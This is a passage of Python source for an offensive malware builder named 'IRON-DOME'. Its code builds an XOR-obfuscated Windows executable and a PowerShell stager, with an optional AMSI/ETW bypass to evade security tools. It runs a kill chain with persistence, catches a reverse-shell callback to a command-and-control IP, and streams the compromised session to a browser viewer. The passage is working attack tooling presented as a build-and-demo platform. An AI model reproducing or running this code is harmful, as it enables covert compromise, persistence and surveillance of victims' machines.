        print(f"  {RED}[!] No TCP callback in 45s{RST}")
        proc.terminate(); return False

    conn, addr = result
    print(f"  {GREEN}[+] Shell connected  {addr[0]}:{addr[1]}{RST}")

    banner = _drain(conn, t=2)
    if banner: print(f"  [+] Banner: {repr(banner[:60])}")

    print(f"\n  {GREEN}[*] Starting CHEYANNE WATCH → http://127.0.0.1:{http_port}{RST}")
    print(f"  {DIM}    Browser opening. Press Ctrl+C to stop VNC stream.{RST}\n")

    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from watch_stream import watch_session
    try:
        _screenshot("vnc_browser_open", out_dir)
        watch_session(conn, target_label=f"{shell_ip}:{shell_port}", http_port=http_port)
    except KeyboardInterrupt:
        pass
    finally:
        _screenshot("vnc_final", out_dir)
        try: proc.kill()
        except: pass
    return True


def full_demo(target: str, port: int, xor_key: int, out_dir: str, variant: int, vader: bool):
    """
    IRON-DOME Full Platform Demo:
      Phase 1 — Build:       PE (8-layer + VADER) + Ghost PS1 stager
      Phase 2 — Kill Chain:  11-step loopback test + 3-vector persistence
      Phase 3 — VNC Watch:   Persistent shell → CHEYANNE Watch → browser
    All phases auto-screenshot to builds/iron_dome/ + showcase/
    """
    # Phase 1: build
    build(target, port, xor_key, out_dir, variant, vader)
    _screenshot("build_complete", out_dir)

    # Phase 2: kill chain (loopback on --port)
    passed, conn, proc = run_kill_chain(port, out_dir)
    if conn:
        try: conn.close()
        except: pass
    if proc:
        try: proc.kill()
        except: pass

    if not passed:
        print(f"\n  {RED}[!] Kill chain failed — aborting VNC phase{RST}\n")
        return

    # Phase 3: VNC on port+1 (avoid conflict with kill chain port)
    vnc_port = port + 1
    launch_vnc_watch("127.0.0.1", vnc_port, out_dir, http_port=8892)


# ── CLI ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IRON-DOME Unified Builder")
    parser.add_argument("--target", default="192.168.1.145", help="C2 listener IP")
    parser.add_argument("--port",   type=int, default=4443,  help="C2 listener port")
    parser.add_argument("--xor",    type=lambda x: int(x,0), default=0xFC, help="XOR key (e.g. 0xAB)")
    parser.add_argument("--out",    default=OUT_DIR,         help="Output directory")
    parser.add_argument("--variant",type=int,  default=1,     help="Variant number")
    parser.add_argument("--vader",  action="store_true",      help="Splice VADER AMSI/ETW bypass (layer 8)")
    parser.add_argument("--full",   action="store_true",
                        help="Full platform demo: Build → Kill Chain → VNC Watch (loopback)")
    args = parser.parse_args()

    if args.full:
        full_demo(args.target, args.port, args.xor, args.out, args.variant, args.vader)
    else:
        build(args.target, args.port, args.xor, args.out, args.variant, args.vader)
